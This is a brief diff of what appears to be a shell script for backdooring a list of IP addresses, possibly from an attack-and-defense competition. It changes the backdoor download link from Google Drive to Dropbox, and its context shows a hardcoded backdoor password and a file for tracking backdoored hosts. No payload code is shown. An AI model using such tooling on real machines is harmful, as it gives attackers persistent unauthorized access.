@@ -9,7 +9,7 @@ backdoor_password="yuh"
 IPs=()
 timeout_duration=1
 scoring_link="https://..."
-backdoor_link="https://drive.usercontent.google.com/download?id=1N_yXow9zudcE48qK1vUsuJPJZOSVMvGh&export=download&authuser=0"
+backdoor_link="https://uca42f5e8142b91ec0ae2312de08.dl.dropboxusercontent.com/cd/0/get/CixXldszaLjpnHM9YlmQKIPMBNL5rInn6LU4QGw0m7eJlSalKGTokB-51MXHitxJpLthy2pSo9HXNxxg5zvaS52jvBcupXvdjWXgKdja41ownbVpT9_481JbpbSY4a6niC_af5f9R_XMGMBqqH1sp38P70rlOO-fWrJP52htTkfMsw/file?_download_id=65901142887226668170736156657998402324571917740645455715224763615&_log_download_success=1#"
 
 touch backdoored_IPs.txt
 
